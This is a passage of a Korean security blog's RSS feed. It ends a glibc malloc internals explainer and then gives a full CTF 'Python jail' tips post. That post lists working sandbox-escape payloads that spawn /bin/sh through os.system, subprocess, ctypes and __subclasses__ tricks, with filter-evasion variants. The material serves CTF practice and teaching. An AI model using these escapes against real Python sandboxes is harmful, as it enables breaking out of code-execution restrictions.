선입선출(FIFO) 방식으로 관리된다.<br>해제되는 청크의 앞 뒤에 존재하는 해제된 청크와 병합을 진행하기 때문에 <code>Fast bin</code>보다는 느리지만, <code>Large bin</code>보다는 빠른 속도로 처리된다.</p><h2 id="3-4-Large-bin"><a href="#3-4-Large-bin" class="headerlink" title="3-4. Large bin"></a>3-4. Large bin</h2><p>크게 두 부분으로 나뉘는데, 첫번째 Large bin은 <code>512-568</code>바이트 크기의 청크를, 두번째 Large bin은 <code>576-632</code>바이트 크기의 청크를 포함한다.<br>환형 이중 연결 리스트로 관리되며, 사이즈 값에 따라 내림차순으로 정렬된다.<br><code>Small bin</code>과 동일하게 할당 해제되었을 때 <code>Unsorted bin</code> 내에 임시적으로 저장되며, 인접한 할당 해제된 청크에 대해서 병합을 진행한다.</p><h2 id="3-5-Top-chunk"><a href="#3-5-Top-chunk" class="headerlink" title="3-5. Top chunk"></a>3-5. Top chunk</h2><p><code>Arena</code>의 최상단에 존재하는 청크이다.<br>동적 메모리 할당 요청이 들어오게 될 경우, 1차적으로 <code>bins</code>에서 재할당 가능한 청크가 존재하는지 검사하고, 재할당이 불가능하다면 <code>Top chunk</code>에서 요청한 크기만큼을 떼어 반환한다.<br>만약 요청 크기가 <code>Top chunk</code>의 크기보다 크다면 <code>sbrk()</code> 또는 <code>mmap()</code> 호출을 통해 확장하며 <code>PREV_INUSE</code> 플래그가 항상 활성화 되어 있다.</p><h2 id="3-6-Last-remainder-chunk"><a href="#3-6-Last-remainder-chunk" class="headerlink" title="3-6. Last remainder chunk"></a>3-6. Last remainder chunk</h2><p>사용자가 작은 크기의 청크를 할당 요청했으나 <code>Small bin</code>, <code>Unsorted bin</code>에 존재하는 할당 해제된 청크중 동일한 크기의 청크의 재할당이 불가능할 경우 요청 크기보다 큰 청크를 찾아, 요청 크기만큼 떼어 할당 후 반환한다. 이때 요청 크기만큼 떼고 남은 크기의 청크가 <code>Last remainder chunk</code>가 된다.</p><hr><h1 id="4-Core-Functions"><a href="#4-Core-Functions" class="headerlink" title="4. Core Functions"></a>4. Core Functions</h1><p>핵심 함수들은 다음과 같다.</p><h2 id="4-1-void-libc-malloc-size-t-bytes"><a href="#4-1-void-libc-malloc-size-t-bytes" class="headerlink" title="4-1. void * __libc_malloc (size_t bytes)"></a>4-1. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L2901" target="_blank" rel="noopener">void * __libc_malloc (size_t bytes)</a></h2><ol><li><code>__malloc_hook</code>이 설정되어 있다면, <code>__malloc_hook</code> 포인터를 호출한다.</li><li><code>__malloc_hook</code>이 설정되어 있지 않다면, <code>arena_get()</code> 함수 호출을 통해 <code>mstate ar_ptr</code> 포인터를 가져온다.</li><li><code>ar_ptr</code>, <code>bytes</code>를 인자로 <code>_int_malloc()</code>함수를 호출한다.</li><li><ol><li>만약 <code>ar_ptr</code>가 <code>NULL</code>이 아니고, <code>_int_malloc()</code>함수의 반환값이 <code>NULL</code>이라면,<ul><li><code>arena_get_retry()</code> 호출을 통해 다른 Arena Pointer를 <code>ar_ptr</code>에 받아오고,</li><li><code>_int_malloc()</code>함수를 새로운 <code>ar_ptr</code>을 인자로 다시 실행한다.</li></ul></li><li>아니라면,<ul><li>해당 Arena에 대해 <code>mutex_unlock()</code>를 호출한다.</li></ul></li></ol></li><li>최종적으로 <code>_int_malloc()</code>의 반환값을 반환하기 전, 아래 사항들을 체크한다.<ul><li><code>_int_malloc()</code> 반환값(청크)이 <code>NULL</code>인지</li><li>청크가 <code>mmap()</code>을 통해 할당되었는지</li><li>해당 청크의 아레나가 <code>2</code>에서 찾은 청크인지</li></ul></li><li><code>5</code>의 내용 중 하나라도 True인 경우, 청크의 포인터를 반환한다.</li></ol><h2 id="4-2-static-void-int-malloc-mstate-av-size-t-bytes"><a href="#4-2-static-void-int-malloc-mstate-av-size-t-bytes" class="headerlink" title="4-2. static void * _int_malloc (mstate av, size_t bytes)"></a>4-2. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L3318" target="_blank" rel="noopener">static void * _int_malloc (mstate av, size_t bytes)</a></h2><ol><li>요청 크기가 범위를 벗어난 값인지 체크 후, <code>size</code>값을 정렬<sup><a href="#fn_size_alignment" id="reffn_size_alignment">size_alignment</a></sup>한다.</li><li><code>av</code>의 값이 NULL인지 체크한다.</li><li>사용 가능한 <code>Arena</code>가 존재하지 않을 경우(<code>av</code>==NULL), <code>sysmalloc()</code>을 통해 <code>mmap()</code>을 호출한다. 만약 반환 값이 존재한다면, <code>alloc_perturb()</code>를 호출한 후 포인터 값을 반환한다.</li><li><ol><li>만약 요청 크기가 <code>Fast bin</code> 범위 안이라면,</li><li>요청 크기와 동일한 크기의 <code>Fast bin</code> index를 받아 첫번째 청크를 <code>victim</code>으로 가져온다.</li><li>만약 <code>victim</code>이 NULL이라면, (2)로 넘어간다. (<code>Small bin</code> 탐색)</li><li>만약 NULL이 아니라면, <code>victim</code>의 사이즈가 해당 <code>Fast bin</code>의 사이즈가 맞는지 체크한다.<ul><li>만약 사이즈가 다르다면, <code>malloc(): memory corruption (fast)</code>를 출력하고, <code>malloc_printerr()</code>를 호출한다.</li><li>만약 사이즈가 동일하다면, 해당 청크의 메모리 포인터를 가져온 후 <code>alloc_perturb()</code>를 호출한 뒤 메모리 포인터를 반환한다.</li></ul></li></ol></li><li><ol><li>만약 요청 크기가 <code>Small bin</code> 범위 안이라면,</li><li>요청 크기와 동일한 크기의 <code>Small bin</code> index를 받아 청크를 <code>victim</code>으로 가져온다.</li><li>만약 <code>victim</code>이 <code>0</code>이라면, <code>malloc_consolidate()</code>를 호출한다.</li><li>아니라면, <code>victim-&gt;bk-&gt;fd != victim</code> 연산을 통해 <code>victim</code> 청크의 <code>fd</code>와 <code>bk</code>가 신뢰할 수 있는 값인지 체크한다.<ul><li>만약 <code>victim-&gt;bk-&gt;fd != victim</code>이라면, <code>malloc(): smallbin double linked list corrupted</code>를 출력한다.</li></ul></li><li><code>set_inuse_bit_at_offset()</code> 호출을 통해 <code>victim</code> 청크의 뒤에 존재하는 청크의 <code>PREV_INUSE</code> flag를 변경한다.</li><li><code>Small bin</code>의 <code>fd</code> <code>bk</code>를 재설정함으로써 <code>victim</code> 청크를 <code>Small bin</code>에서 제거한다.</li><li>현재 <code>Arena</code>가 <code>main_arena</code>가 아닐 경우, <code>NON_MAIN_ARENA</code> flag를 설정한다.</li><li>해당 청크의 메모리 포인터를 가져온 후 <code>alloc_perturb()</code>를 호출한 뒤 메모리 포인터를 반환한다.</li></ol></li><li>만약 요청 크기가 <code>Large bin</code> 범위라면,<ul><li>현재 <code>Arena</code>에 <code>Fast bin</code> 청크가 존재하는지 확인한 후, 존재한다면 <code>malloc_consolidate()</code>를 호출하여 청크를 병합한다. (<code>Fast bin</code> Chunk로 인한 단편화(fragmentation) 방지)</li></ul></li><li><ol><li><code>Unsorted bin</code>에서 청크를 <code>victim</code>으로 가져온다.<br>2.<code>victim</code>의 크기가 최소 크기(<code>2*SIZE_SZ</code>)보다 작거나 최대 크기(<code>av-&gt;system_mem</code>)보다 큰지 체크한 후, 작거나 크다면 <code>malloc(): memory corruption</code>을 출력한다.</li><li>만약 요청 크기가 <code>Small bin</code> 범위이며(<code>4.2</code>에서 할당이 되었어야 하지만, <code>bin</code>내에 가용 청크가 없어서 할당되지 못한 경우), <code>victim</code>이 <code>Unsorted bin</code> 내의 유일한 청크이며, <code>victim</code>이 <code>last_remainder</code> 청크이며, <code>victim</code>의 크기가 요청 크기보다 클 경우,<ul><li><code>victim</code> 청크를 <strong>할당된 청크</strong>와 <strong>Last remainder</strong>청크로 나눈 후 header,flag 설정 후 반환한다.</li></ul></li><li>위의 4개의 조건이 하나라도 <code>False</code>일 경우, <code>victim</code>을 <code>Unsorted bin</code>에서 제거한다.</li><li>만약 <code>victim</code>의 크기가 요청 크기와 정확하게 일치할 경우,<ul><li><code>PREV_INUSE</code>, <code>NON_MAIN_ARENA</code> 등의 flag를 설정하고 <code>alloc_perturb()</code>를 호출한 뒤 해당 청크를 반환한다.</li></ul></li><li>만약 요청 크기가 <code>Small bin</code> 범위라면,<ul><li>해당 크기의 bin을 가져와 <code>bck</code>로 설정하고, <code>bck-&gt;fd</code>를 <code>fwd</code>로 설정한다.</li></ul></li><li>만약 요청 크기가 <code>Large bin</code> 범위라면,<ul><li><code>size</code> 필드에 flag bit를 붙이고, <code>Large bin</code>을 정렬한다.<ul><li>만약 <code>victim</code>이 마지막 청크(크기가 가장 작은)보다 작다면, 마지막 위치에 삽입한다.</li><li>아니라면, <code>victim size</code> &lt;= <code>chunk size</code>를 찾아 삽입한다. 만약 크기가 같으면 <code>victim</code>은 <code>chunk</code> 뒤에 삽입된다.</li></ul></li></ul></li><li><code>7.1~7</code>의 내용을 최대 10000번 실행한다.</li></ol></li></ol><h2 id="4-3-void-libc-free-void-mem"><a href="#4-3-void-libc-free-void-mem" class="headerlink" title="4-3. void __libc_free (void *mem)"></a>4-3. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L2933" target="_blank" rel="noopener">void __libc_free (void *mem)</a></h2><ol><li>만약, <code>__free_hook</code>이 설정되어 있다면, <code>__free_hook</code>을 호출한다.</li><li><code>mem</code> 값이 NULL인지 체크한다.</li><li>할당 해제하려는 청크가 <code>mmap()</code> 호출을 통해 할당된 청크라면 <code>munmap_chunk()</code>를 통해 할당 해제한다.</li><li>아니라면, 해당 청크에 대한 <code>arena</code>를 가져와 <code>_int_free()</code>를 호출한다.</li></ol><h2 id="4-4-static-void-int-free-mstate-av-mchunkptr-p-int-have-lock"><a href="#4-4-static-void-int-free-mstate-av-mchunkptr-p-int-have-lock" class="headerlink" title="4-4. static void _int_free (mstate av, mchunkptr p, int have_lock)"></a>4-4. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L3840" target="_blank" rel="noopener">static void _int_free (mstate av, mchunkptr p, int have_lock)</a></h2><ol><li><code>p &lt; p + chunksize(p)</code>인지, <code>p</code>가 정렬된 포인터인지 체크한다.<ul><li>만약 아니라면, <code>free(): invalid pointer</code>를 출력한다.</li></ul></li><li><code>chunksize(p) &lt; MINSIZE</code>인지, 크기가 올바르게 정렬되었는지 체크한다.<ul><li>아니라면, <code>free(): invalid size</code>를 출력한다.</li></ul></li><li>해당 청크의 크기가 <code>Fast bin</code> 범위인지 체크한다.<ol><li>해당 청크 다음에 존재하는 청크의 크기가 최소 크기 <code>2*SIZE_SZ</code>보다 작거나, 최대 크기 <code>av-&gt;system_mem</code>보다 크다면 <code>free(): invalid next size (fast)</code>를 출력한다.</li><li>해당 청크에 대해 <code>free_perturb()</code>를 호출한다.</li><li><code>mstate</code>의 <code>FASTCHUNKS_BIT</code>를 설정한다.</li><li>해당 크기에 맞는 <code>Fast bin</code> index를 찾는다.</li><li>해당 <code>Fast bin</code> index의 최상단에 있는 청크가 해제하려는 청크인지 확인한 후, 맞다면 <code>double free or corruption (fasttop)</code>을 출력한다.</li><li>해당 index의 최상단에 있는 청크의 크기와 해제하려는 청크의 크기를 비교 후, 다르다면 <code>invalid fastbin entry (free)</code>를 출력한다.</li><li>해제하려는 청크를 <code>Fast bin</code> 최상단에 넣고, 끝낸다.</li></ol></li><li>만약 해당 청크가 <code>mmap()</code>을 통해 할당된 청크가 아니라면,<ol><li>만약 해당 청크가 <code>top chunk</code>라면, <code>double free or corruption (top)</code>을 출력한다.</li><li>만약 메모리상의 다음 청크가 해당 <code>Arena</code>의 영역을 벗어난다면, <code>double free or corruption (out)</code>을 출력한다.</li><li>만약 메모리상의 다음 청크의 <code>PREV_INUSE</code> flag가 설정되어 있지 않다면, <code>double free or corruption (!prev)</code>를 출력한다.</li><li>만약 다음 청크의 크기가 최소 크기(<code>2*SIZE_SZ</code>)보다 작거나 최대 크기(<code>av-&gt;system_mem</code>)보다 크다면, <code>free(): invalid next size (normal)</code>을 출력한다.</li><li>해당 청크에 대해 <code>free_perturb()</code>를 호출한다.</li><li>만약 해당 청크의 <code>PREV_INUSE</code> flag가 설정되어 있지 않다면, 이전 청크에 대해 <code>unlink</code>를 호출해 병합을 진행한다.</li><li>만약 다음 청크가 <code>top Chunk</code>가 아닐 경우,<ul><li>다음 청크가 사용중이지 않을 경우 <code>unlink</code>를 호출해 병합을 진행한다.</li><li><code>unsorted_chunk-&gt;fd-&gt;bk != unsorted_chunk</code>인지 체크한 후, 같지 않다면 <code>free(): corrupted unsorted chunks</code>를 출력한다.</li><li>청크를 <code>Unsorted bin</code>에 넣는다.<br>8.만약 다음 청크가 <code>Top Chunk</code>라면 병합을 진행한다.</li></ul></li></ol></li><li>만약 해당 청크가 <code>mmap()</code>을 통해 할당된 청크라면, <code>munmap_chunk()</code>을 호출하여 할당 해제한다.</li></ol><h2 id="4-5-unlink-AV-P-BK-FD"><a href="#4-5-unlink-AV-P-BK-FD" class="headerlink" title="4-5. unlink(AV, P, BK, FD)"></a>4-5. <a href="https://github.com/nonetype/heap-analysis/blob/63f85c0bbe27ef2cd086ca7647b2b3775886f7dc/malloc.c#L1414" target="_blank" rel="noopener">unlink(AV, P, BK, FD)</a></h2><ol><li><code>chunk-&gt;fd-&gt;bk != chunk</code>이거나, <code>chunk-&gt;bk-&gt;fd != chunk</code>일 경우, <code>corrupted double-linked list</code>를 출력한다.</li><li><code>chunk-&gt;fd = chunk-&gt;bk</code>, <code>chunk-&gt;bk = chunk-&gt;fd</code>를 수행한다. (이중 연결 리스트에서 해당 청크를 제거한다.)</li><li>청크의 크기가 <code>Small bin</code> 범위가 아니라면, <code>chunk-&gt;fd_nextsize-&gt;bk_nextsize != chunk</code>이거나 <code>chunk-&gt;bk_nextsize-&gt;fd_nextsize != chunk</code>일 경우, <code>corrupted double-linked list (not small)</code>을 출력한다.</li><li><code>chunk-&gt;fd_nextsize</code>, <code>chunk-&gt;bk_nextsize</code>에 대해 위와 동일하게 연결 해제한다.</li></ol><hr><h1 id="5-Error-Checks"><a href="#5-Error-Checks" class="headerlink" title="5. Error Checks"></a>5. Error Checks</h1><h2 id="5-1-checks-in-int-malloc"><a href="#5-1-checks-in-int-malloc" class="headerlink" title="5-1 checks in _int_malloc"></a>5-1 checks in _int_malloc</h2><div class="table-container"><table><thead><tr><th style="text-align:left">Checks</th><th style="text-align:left">Error Message</th></tr></thead><tbody><tr><td style="text-align:left"><code>fastbin_index (chunksize (victim)) != idx</code></td><td style="text-align:left">malloc(): memory corruption (fast)</td></tr><tr><td style="text-align:left"><code>victim-&gt;bk-&gt;fd != victim</code></td><td style="text-align:left">malloc(): smallbin double linked list corrupted</td></tr><tr><td style="text-align:left"><code>victim-&gt;size &lt;= 2 * SIZE_SZ</code> or <code>victim-&gt;size &gt; av-&gt;system_mem</code></td><td style="text-align:left">malloc(): memory corruption</td></tr><tr><td style="text-align:left"><code>unsorted-&gt;fd-&gt;bk != unsorted</code></td><td style="text-align:left">malloc(): corrupted unsorted chunks</td></tr><tr><td style="text-align:left"><code>unsorted-&gt;fd-&gt;bk != unsorted</code>(in best-fit loop)</td><td style="text-align:left">malloc(): corrupted unsorted chunks 2</td></tr></tbody></table></div><hr><h2 id="5-2-checks-in-int-free"><a href="#5-2-checks-in-int-free" class="headerlink" title="5-2 checks in _int_free"></a>5-2 checks in _int_free</h2><div class="table-container"><table><thead><tr><th style="text-align:left">Checks</th><th style="text-align:left">Error Message</th></tr></thead><tbody><tr><td style="text-align:left"><code>(uintptr_t) p &gt; (uintptr_t) -size</code> or <code>misaligned_chunk (p)</code></td><td style="text-align:left">free(): invalid pointer</td></tr><tr><td style="text-align:left"><code>size &lt; MINSIZE</code> or <code>!aligned_OK (size)</code></td><td style="text-align:left">free(): invalid size</td></tr><tr><td style="text-align:left"><code>next-&gt;size &lt;= 2 * SIZE_SZ</code> or <code>next-&gt;size &gt;= av-&gt;system_mem</code></td><td style="text-align:left">free(): invalid next size (fast)</td></tr><tr><td style="text-align:left"><code>top(fastbin) == p</code></td><td style="text-align:left">double free or corruption (fasttop)</td></tr><tr><td style="text-align:left"><code>old_idx != idx</code></td><td style="text-align:left">invalid fastbin entry (free)</td></tr><tr><td style="text-align:left"><code>p == av-&gt;top</code></td><td style="text-align:left">double free or corruption (top)</td></tr><tr><td style="text-align:left"><code>nextchunk &gt; = ((char *) av-&gt;top + chunksize(av-&gt;top))</code></td><td style="text-align:left">double free or corruption (out)</td></tr><tr><td style="text-align:left"><code>!prev_inuse(nextchunk)</code></td><td style="text-align:left">double free or corruption (!prev)</td></tr><tr><td style="text-align:left"><code>nextsize &gt;= av-&gt;system_mem</code></td><td style="text-align:left">free(): invalid next size (normal)</td></tr><tr><td style="text-align:left"><code>fwd-&gt;bk != bck</code></td><td style="text-align:left">free(): corrupted unsorted chunks</td></tr></tbody></table></div><hr><h2 id="5-3-checks-in-unlink"><a href="#5-3-checks-in-unlink" class="headerlink" title="5-3 checks in unlink"></a>5-3 checks in unlink</h2><div class="table-container"><table><thead><tr><th style="text-align:left">Checks</th><th style="text-align:left">Error Message</th></tr></thead><tbody><tr><td style="text-align:left"><code>FD-&gt;bk != P</code> or <code>BK-&gt;fd != P, 0</code></td><td style="text-align:left">corrupted double-linked list</td></tr><tr><td style="text-align:left"><code>P-&gt;fd_nextsize-&gt;bk_nextsize != P</code> or <code>P-&gt;bk_nextsize-&gt;fd_nextsize != P</code></td><td style="text-align:left">corrupted double-linked list (not small)</td></tr></tbody></table></div><hr><h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며.."></a>마치며..</h1><p>전에는 단순히 다른 사람이 정리해놓은 문서를 보고 필요한 만큼만 이해했었는데, 이 문서를 쓰면서 bin을 찾는 과정이나, bin에 넣는 과정 등등을 알아갈 수 있었다.</p><p>아쉬운 점은 세부적으로 분석은 많이 했는데 간단하게 표현을 하지 못한 점, 많은 부분(힙익스 페이로드를 놓고, 어떻게 동작하는지, 어떤 부분을 이용한건지 등등)을 써보고 싶었지만 팀프로젝트 기간이라 당장 리눅스 커널 익스를 해야하는 형국이라 나중에 시간이 나게 되면 추가적으로 문서화하도록 해야겠다.</p><p>리눅스 커널 익스하면서도 kmalloc, vmalloc 등 특이한 동적 메모리 관리 방법도 알아가는 중이라 틈틈히 추가하고 다듬는 과정을 통해서 더 정확하고, 유익한 정보가 있는 문서가 되었으면 좋겠다.</p><hr><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>[Understanding glibc malloc 번역] <a href="https://tribal1012.tistory.com/78" target="_blank" rel="noopener">https://tribal1012.tistory.com/78</a></p><p>[Heap 영역 정리] <a href="https://tribal1012.tistory.com/141" target="_blank" rel="noopener">https://tribal1012.tistory.com/141</a></p><p>[Hacker’s Hut: Exploiting the heap] <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-11.html" target="_blank" rel="noopener">https://www.win.tue.nl/~aeb/linux/hh/hh-11.html</a></p><p>[glib malloc] <a href="https://umbum.tistory.com/386" target="_blank" rel="noopener">https://umbum.tistory.com/386</a></p><blockquote id="fn_size_alignment"><sup>size_alignment</sup>. <code>sizeof(size_t) * 2</code>(32비트에서 8바이트) 단위로 정렬된다.<a href="#reffn_size_alignment" title="Jump back to footnote [size_alignment] in the text."> &#8617;</a></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/30/Pwn/%E3%84%B4%20Research/malloc/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Python Jail Tips</title>
      <link>https://defenit.kr/2019/09/27/Pwn/%E3%84%B4%20Research/python_jail/</link>
      <guid>https://defenit.kr/2019/09/27/Pwn/%E3%84%B4%20Research/python_jail/</guid>
      <pubDate>Fri, 27 Sep 2019 04:48:25 GMT</pubDate>
      <description>
      
        
        
          &lt;h3 id=&quot;목차&quot;&gt;&lt;a href=&quot;#목차&quot; class=&quot;headerlink&quot; title=&quot;목차&quot;&gt;&lt;/a&gt;목차&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;문자열 만들기&lt;/li&gt;
&lt;li&gt;숫자 만들기&lt;/li&gt;
&lt;li&gt;문자열 합치기&lt;/li&gt;
&lt;li&gt;응용&lt;/li&gt;
&lt;li&gt;Ti
        
      
      </description>
      
      <content:encoded><![CDATA[<h3 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h3><ul><li>문자열 만들기</li><li>숫자 만들기</li><li>문자열 합치기</li><li>응용</li><li>Tips</li></ul><hr><h3 id="문자열-만들기"><a href="#문자열-만들기" class="headerlink" title="문자열 만들기"></a>문자열 만들기</h3><ul><li><code>chr(0x61)</code>          # ‘a’</li><li><code>str(1)</code>                # ‘1’</li><li><code>dir([])[0][2]</code> # ‘a’<ul><li>dir([])만 입력했을 때 결과는 다음과 같고 이를 인덱싱해서 문자열을 얻는 것이다.<ul><li><img src="https://user-images.githubusercontent.com/43925259/65742854-ed721c80-e12c-11e9-8d4f-9d4c33f0c3dc.png" alt="1"></li></ul></li></ul></li></ul><hr><h3 id="숫자-만들기"><a href="#숫자-만들기" class="headerlink" title="숫자 만들기"></a>숫자 만들기</h3><ul><li><code>~(()&lt;())</code>                  # -1</li><li><code>({}&lt;[])&gt;&gt;({}&lt;[])</code> #  0</li><li><code>({}&lt;[])&lt;&lt;({}&gt;[])</code> #  1</li><li><code>({}&lt;[])&lt;&lt;({}&lt;[])</code> #  2</li></ul><hr><h3 id="문자열-합치기"><a href="#문자열-합치기" class="headerlink" title="문자열 합치기"></a>문자열 합치기</h3><ul><li><code>&#39;a&#39;+&#39;b&#39;</code></li><li><code>&#39;a&#39;&#39;b&#39;</code></li><li><code>&#39;&#39;.join([&#39;a&#39;,&#39;b&#39;])</code></li><li><code>&#39;{}{}&#39;.format(&#39;a&#39;,&#39;b&#39;)</code></li><li><code>&#39;a&#39;.__add__(&#39;b&#39;)</code></li></ul><hr><h3 id="응용"><a href="#응용" class="headerlink" title="응용"></a>응용</h3><ul><li><p><code>.</code> 을 사용하지 못할경우</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">'__import__("os")\x2esystem("sh")'</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(<span class="string">'os'</span>),<span class="string">'system'</span>)(<span class="string">'sh'</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars(__import__(<span class="string">'os'</span>))[<span class="string">'system'</span>](<span class="string">'sh'</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(dir(__import__(<span class="string">"glob"</span>))[<span class="number">23</span>]),dir(__import__(dir(__import__(<span class="string">"glob"</span>))[<span class="number">23</span>]))[<span class="number">309</span>])(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p><code>_</code> 를 사용하지 못할경우</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">'\x5f\x5fimport\x5f\x5f("os").system("sh")'</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(vars(vars()[dir()[<span class="number">0</span>]])[<span class="string">'\x5f\x5fimport\x5f\x5f'</span>](<span class="string">'os'</span>), <span class="string">'system'</span>)(<span class="string">'sh'</span>)</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>문자열을 사용하지 못할경우</p><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vars(vars()[dir()[<span class="number">0</span>]])[dir(__builtins__)[<span class="number">56</span>]](dir()[<span class="number">1</span>][<span class="number">3</span>]+dir()[<span class="number">0</span>][<span class="number">9</span>]).system(dir(__doc__)[<span class="number">0</span>][<span class="number">5</span>] + dir(__doc__)[<span class="number">5</span>][<span class="number">2</span>])</span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><ul><li><h5 id="파일-경로-알아오기"><a href="#파일-경로-알아오기" class="headerlink" title="파일 경로 알아오기"></a>파일 경로 알아오기</h5><ul><li><p><code>raise(BaseException())</code> 를 이용</p></li><li><p><img src="https://user-images.githubusercontent.com/43925259/65742856-f19e3a00-e12c-11e9-85b9-7b90237a72b7.png" alt="2"></p></li></ul></li></ul><ul><li><h5 id="필터링-단어-삭제"><a href="#필터링-단어-삭제" class="headerlink" title="필터링 단어 삭제"></a>필터링 단어 삭제</h5><ul><li><p>필터링 체크를 같은 파일 내에서 하고, <code>dir</code> 등을 이용해서 변수명을 가져올 수 있을 경우 <code>del</code>을 이용</p></li><li><p><img src="https://user-images.githubusercontent.com/43925259/65742857-f367fd80-e12c-11e9-8079-db276e9336c6.png" alt="3"></p></li><li><p>필터링하는 변수명을 dir()로 알아내고 del로 import를 지운 모습이다.</p></li></ul></li></ul><ul><li><h5 id="import가-있을-경우-셸-따는-법"><a href="#import가-있을-경우-셸-따는-법" class="headerlink" title="import가 있을 경우 셸 따는 법"></a>import가 있을 경우 셸 따는 법</h5><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"os"</span>).system(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"subprocess"</span>).call(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure></li><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"ctypes"</span>).CDLL(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>).system(<span class="string">"/bin/sh"</span>)</span><br></pre></td></tr></table></figure><ul><li>서버 우분투 버전에 따라 주소가 다를 수 있는데, <code>2.23 ~ 2.29</code>까지 숫자만 바꿔보면 된다.</li></ul></li></ul></li></ul><ul><li><h5 id="execfile-사용"><a href="#execfile-사용" class="headerlink" title="execfile 사용"></a><code>execfile 사용</code></h5><ul><li><p><code>execfile(&#39;/usr/lib/python2.7/os.py&#39;)</code> 처럼 사용할 경우 os 모듈의 함수 사용 가능</p><ul><li><p>주소는 서버 환경에 따라 다를수도 있다.</p></li><li><p><code>from os import *</code>가 된 것과 동일하기 때문에 <code>system(&quot;/bin/sh&quot;)</code> 가능</p></li></ul></li></ul></li></ul><ul><li><h5 id="open이-필터링-되어있을-때-file-사용"><a href="#open이-필터링-되어있을-때-file-사용" class="headerlink" title="open이 필터링 되어있을 때, file 사용"></a><code>open</code>이 필터링 되어있을 때, <code>file</code> 사용</h5><ul><li>file도 open과 같이 파일을 열 수 있는 명령이고 read가 필터링 안되었다면 유용하다.</li></ul></li></ul><ul><li><h5 id="이-필터링-되어있을-때-변수-선언"><a href="#이-필터링-되어있을-때-변수-선언" class="headerlink" title="=이 필터링 되어있을 때 변수 선언"></a><code>=</code>이 필터링 되어있을 때 <strong>변수 선언</strong></h5><ul><li><p><code>setattr(__builtins__,&#39;a&#39;,&#39;b&#39;)</code></p><ul><li>a = ‘b’와 동일한 표현</li></ul></li></ul></li></ul><ul><li><h5 id="spawnlp-이용"><a href="#spawnlp-이용" class="headerlink" title="spawnlp 이용"></a><code>spawnlp</code> 이용</h5><ul><li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">o = &#123;x.__name__:x <span class="keyword">for</span> x <span class="keyword">in</span> object.__subclasses__()&#125;[<span class="string">'StreamReaderWriter'</span>].__init__.__globals__[<span class="string">'sys'</span>].modules[<span class="string">'o'</span>+<span class="string">'s'</span>]</span><br><span class="line">o.spawnlp(o.P_WAIT, <span class="string">'ls'</span>, <span class="string">'ls'</span>, <span class="string">'-l'</span>, <span class="string">'./'</span>)</span><br></pre></td></tr></table></figure></li><li><p><code>import</code>, <code>system</code>, <code>os</code> 등이 필터링 되어있을 경우 유용하게 사용 가능</p></li></ul></li></ul><hr><h3 id="레퍼런스"><a href="#레퍼런스" class="headerlink" title="레퍼런스"></a>레퍼런스</h3><p>없음</p><hr><h3 id="문서-역사"><a href="#문서-역사" class="headerlink" title="문서 역사"></a>문서 역사</h3><p><code>2019-09-27</code> <strong>c2w2m2: 최초 작성</strong></p><p><code>2019-09-27</code> <strong>JSec: 내용 보충</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content:encoded>
      
      <comments>https://defenit.kr/2019/09/27/Pwn/%E3%84%B4%20Research/python_jail/#disqus_thread</comments>
    </item>
    
    <item>
      <title>InCTF 2019 Copy-Cat Write up</title>
      <link>https://defenit.kr/2019/09/24/Web/%E3%84%B4%20WriteUps/InCTF_2019_Copy-Cat_Writeup/</link>
      <guid>https://defenit.kr/2019/09/24/Web/%E3%84%B4%20WriteUps/InCTF_2019_Copy-Cat_Writeup/</guid>
